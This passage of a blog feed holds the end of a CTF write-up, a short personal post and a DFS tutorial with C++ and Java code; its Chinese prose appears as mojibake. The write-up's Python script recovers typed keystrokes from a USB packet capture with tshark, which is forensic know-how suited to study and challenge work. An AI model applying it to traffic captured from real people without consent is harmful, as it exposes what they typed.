string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>å¾…æ›´æ–°ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
      <category term="ä¿¡æ¯å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘æ˜¯ä¸€ä¸ªèœé¸¡</title>
    <link href="http://www.yof3ng.xyz/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
    <id>http://www.yof3ng.xyz/2018/11/11/æˆ‘æ˜¯ä¸€ä¸ªèœé¸¡/</id>
    <published>2018-11-11T13:50:58.000Z</published>
    <updated>2019-04-02T08:46:45.788Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="èœé¸¡"><a href="#èœé¸¡" class="headerlink" title="èœé¸¡"></a>èœé¸¡</h1><p>ä½ æ€ä¹ˆè¿™ä¹ˆèœå•Šï¼é¸½äº†äº”å¤©äº†ï¼è¦åšé¢“åºŸèœé¸¡äº†å—ğŸ˜­ï¼ä½ åˆlowåˆèœè¿˜ä¸åŠªåŠ›ï¼Œåˆæƒ³éšæ³¢é€æµï¼ˆå’¸é±¼çœŸé¦™ğŸ˜„ï¼‰ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="æ‚æ–‡" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="æˆ‘æ˜¯èœé¸¡" scheme="http://www.yof3ng.xyz/tags/%E6%88%91%E6%98%AF%E8%8F%9C%E9%B8%A1/"/>
    
  </entry>
  
  <entry>
    <title>DFSæ·±æœ_Oil_Deposits</title>
    <link href="http://www.yof3ng.xyz/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
    <id>http://www.yof3ng.xyz/2018/11/07/DFSæ·±æœ-Oil-Deposits/</id>
    <published>2018-11-07T14:26:26.000Z</published>
    <updated>2019-04-02T08:45:26.155Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"><a href="#ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰" class="headerlink" title="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"></a>ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 â‰¤ m â‰¤ 100 and 1 â‰¤ n â‰¤ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either â€˜*â€™, representing theabsence of oil, or â€˜@â€™, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>å¼•ç”¨ä¸€ä¸‹ç™¾åº¦ç™¾ç§‘ï¼š</p><blockquote><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯DFS(Depth First Search)ï¼š</p><p>æ·±åº¦ä¼˜å…ˆæœç´¢æ˜¯ä¸€ç§åœ¨å¼€å‘çˆ¬è™«æ—©æœŸä½¿ç”¨è¾ƒå¤šçš„æ–¹æ³•ã€‚å®ƒçš„ç›®çš„æ˜¯è¦è¾¾åˆ°è¢«æœç´¢ç»“æ„çš„å¶ç»“ç‚¹(å³é‚£äº›ä¸åŒ…å«ä»»ä½•<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>çš„<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTMLæ–‡ä»¶</a>) ã€‚åœ¨ä¸€ä¸ªHTMLæ–‡ä»¶ä¸­ï¼Œå½“ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>è¢«é€‰æ‹©åï¼Œè¢«é“¾æ¥çš„HTMLæ–‡ä»¶å°†æ‰§è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå³åœ¨æœç´¢å…¶ä½™çš„è¶…é“¾ç»“æœä¹‹å‰å¿…é¡»å…ˆå®Œæ•´åœ°æœç´¢å•ç‹¬çš„ä¸€æ¡é“¾ã€‚æ·±åº¦ä¼˜å…ˆæœç´¢æ²¿ç€HTMLæ–‡ä»¶ä¸Šçš„<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>èµ°åˆ°ä¸èƒ½å†æ·±å…¥ä¸ºæ­¢ï¼Œç„¶åè¿”å›åˆ°æŸä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå†ç»§ç»­é€‰æ‹©è¯¥HTMLæ–‡ä»¶ä¸­çš„å…¶ä»–è¶…é“¾ã€‚å½“ä¸å†æœ‰å…¶ä»–<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>å¯é€‰æ‹©æ—¶ï¼Œè¯´æ˜æœç´¢å·²ç»ç»“æŸã€‚</p></blockquote><blockquote><p>ç»å¸¸é‡åˆ°çš„ä¸ä»…æœ‰DFSï¼Œè¿˜æœ‰BFS(Breadth First Search):</p><p>å®½åº¦ä¼˜å…ˆ<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">æœç´¢ç®—æ³•</a>ï¼ˆåˆç§°å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼‰æ˜¯æœ€ç®€ä¾¿çš„å›¾çš„æœç´¢ç®—æ³•ä¹‹ä¸€ï¼Œè¿™ä¸€ç®—æ³•ä¹Ÿæ˜¯å¾ˆå¤šé‡è¦çš„å›¾çš„ç®—æ³•çš„åŸå‹ã€‚Dijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">å•æºæœ€çŸ­è·¯å¾„</a>ç®—æ³•å’ŒPrim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">æœ€å°ç”Ÿæˆæ ‘</a>ç®—æ³•éƒ½é‡‡ç”¨äº†å’Œå®½åº¦ä¼˜å…ˆæœç´¢ç±»ä¼¼çš„æ€æƒ³ã€‚å…¶åˆ«ååˆå«BFSï¼Œå±äºä¸€ç§ç›²ç›®æœå¯»æ³•ï¼Œç›®çš„æ˜¯ç³»ç»Ÿåœ°å±•å¼€å¹¶æ£€æŸ¥å›¾ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œä»¥æ‰¾å¯»ç»“æœã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå¹¶ä¸è€ƒè™‘ç»“æœçš„å¯èƒ½ä½ç½®ï¼Œå½»åº•åœ°æœç´¢æ•´å¼ å›¾ï¼Œç›´åˆ°æ‰¾åˆ°ç»“æœä¸ºæ­¢ã€‚</p><p>BFSåœ¨æ±‚è§£æœ€çŸ­è·¯å¾„æˆ–è€…æœ€çŸ­æ­¥æ•°ä¸Šæœ‰å¾ˆå¤šçš„åº”ç”¨ã€‚åº”ç”¨æœ€å¤šçš„æ˜¯åœ¨èµ°è¿·å®«ä¸Šã€‚</p></blockquote><p>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬éœ€è¦å‘å…«ä¸ªæ–¹å‘è¿›è¡Œæœç´¢ï¼Œå¹¶ä¸”è¿›è¡Œåˆ¤æ–­</p><p>å¯ä»¥ç”¨c++å†™å‡ºï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®šä¹‰å…¨å±€çš„ï¼Œmå’Œn</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ä¸»å‡½æ•°</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ¥å—å¤šç»„æ•°æ®</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//å®šä¹‰æ·±åº¦ä¼˜å…ˆæœç´¢</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//è·Ÿä¸ªæ‰«æä»ªä¼¼çš„ï¼Œé€’å½’æœç´¢</span>    <span class="token comment" spellcheck="true">//å¦‚æœä¸ä¸º@æˆ–è€…è¶…å‡ºèŒƒå›´ï¼Œåˆ™åœæ­¢è¯¥æ–¹å‘æœç´¢</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>javaé‡æ„ç‰ˆ:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//æ³¨æ„è¿™é‡Œå› ä¸ºæ˜¯åŠ¨æ€ç”³è¯·æ•°ç»„ï¼Œä¸C++ä¸åŒï¼Œå¦‚æœä¸å…ˆåˆ¤æ–­å¥½å‚æ•°å¤§å°ï¼Œä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œçš„é—®é¢˜</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token 